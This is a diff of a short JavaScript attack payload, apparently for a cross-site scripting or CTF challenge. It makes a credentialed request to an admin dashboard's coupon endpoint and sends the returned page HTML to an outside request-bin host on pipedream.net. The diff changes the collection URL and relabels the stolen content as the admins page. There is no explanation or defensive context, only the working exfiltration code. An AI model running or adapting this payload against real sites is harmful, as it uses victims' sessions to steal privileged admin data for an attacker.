@@ -4,20 +4,26 @@ xhr.open('GET', 'https://haatadmindashboard.azurewebsites.net/admin/get_coupons?
 
 xhr.withCredentials = true;
 xhr.onreadystatechange = function() {
-	if (xhr.readyState == 4) {
-		var http = new XMLHttpRequest();
-		var url = "https://en3ssg27t0zsn.x.pipedream.net/meme";
-		http.open("POST", url, true);
-		http.setRequestHeader("Content-type", "text/plain");
-		http.onreadystatechange = function() {
-			if (http.readyState == 4 && http.status == 200) {
-			}
-		};
-		page_data = {
-			"page_html": xhr.responseText,
-			"uri": 'https://haatadmindashboard.azurewebsites.net/admin/get_coupons'
-		};
-		http.send(JSON.stringify(page_data));
-	}
+  if (xhr.readyState == 4) {
+
+        var http = new XMLHttpRequest();
+        var url = "https://enxg7v5ip50sd.x.pipedream.net/hello";
+        http.open("POST", url, true);
+        http.setRequestHeader("Content-type", "text/plain");
+        http.onreadystatechange = function() {
+            if (http.readyState == 4 && http.status == 200) {
+
+            }
+        };
+        
+           page_data = {
+                    "page_html": xhr.responseText.substring(0,90000),
+                    "uri": 'https://haatadmindashboard.azurewebsites.net/admin/get_admins'
+                };
+        http.send(JSON.stringify(page_data));
+
+
+
+  }
 };
 xhr.send(null);
